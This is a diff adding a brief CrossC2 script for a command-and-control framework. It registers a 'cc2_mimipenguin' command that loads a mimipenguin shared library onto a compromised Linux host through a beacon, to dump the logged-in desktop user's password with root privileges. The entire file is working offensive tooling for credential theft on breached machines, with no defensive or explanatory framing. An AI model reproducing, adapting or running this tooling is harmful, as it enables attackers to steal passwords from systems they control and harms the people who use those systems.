@@ -1,0 +1,31 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+sub printUsage_mimipenguin {
+    blog($1, "\nUsage: cc2_mimipenguin <linux(32)/osx>\n\troot permissions\ndump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin linux");
+}
+
+ssh_alias cc2_mimipenguin {
+    $taskName = "cc2_mimipenguin"; # taskName
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # info -> normal message
+
+    $beaconid = $1;
+    $arch = $2;
+    $transportArg = "blankArg";
+
+    if ($arch eq "linux32") {
+        $loadlib = "gather/password/mimipenguin/mimipenguin32.so";
+    } else if ($arch eq "linux") {
+        $loadlib = "gather/password/mimipenguin/mimipenguin.so";
+    } else {
+        berror($beaconid, "*[error]: Only supports linux.");
+        printUsage_mimipenguin($beaconid);
+        return;
+    }
+    blog($beaconid, "mimipenguin dump login password");
+
+    bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+}
+
+ssh_command_register("cc2_mimipenguin", "CrossC2 mimipenguin - dump the login password from the current linux desktop", "\nUsage: cc2_mimipenguin <linux(32)/osx>\n\tneed root permissions, dump the login password from the current linux desktop\nEx:\n\tcc2_mimipenguin linux");
